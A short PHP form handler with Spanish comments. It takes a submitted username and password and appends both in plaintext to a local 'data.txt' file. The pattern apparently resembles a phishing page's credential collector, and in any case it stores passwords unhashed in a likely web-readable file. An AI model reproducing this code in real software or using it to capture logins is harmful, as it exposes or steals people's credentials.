<?php
// Asegúrate de que el formulario se haya enviado
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger datos del formulario
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Especificar el nombre del archivo
    $file = 'data.txt';
    
    // Crear el contenido para el archivo
    $content = "Username: $username\nPassword: $password\n";
    
    // Intentar abrir el archivo en modo de adición (append)
    $handle = fopen($file, 'a');
    
    if ($handle === false) {
        echo "No se pudo abrir el archivo.";
        exit;
    }
    
    // Escribir el contenido en el archivo
    if (fwrite($handle, $content) === false) {
        echo "No se pudo escribir en el archivo.";
        fclose($handle);
        exit;
    }
    
    // Cerrar el archivo
    fclose($handle);
    
    echo "Datos guardados correctamente.";
}
?>
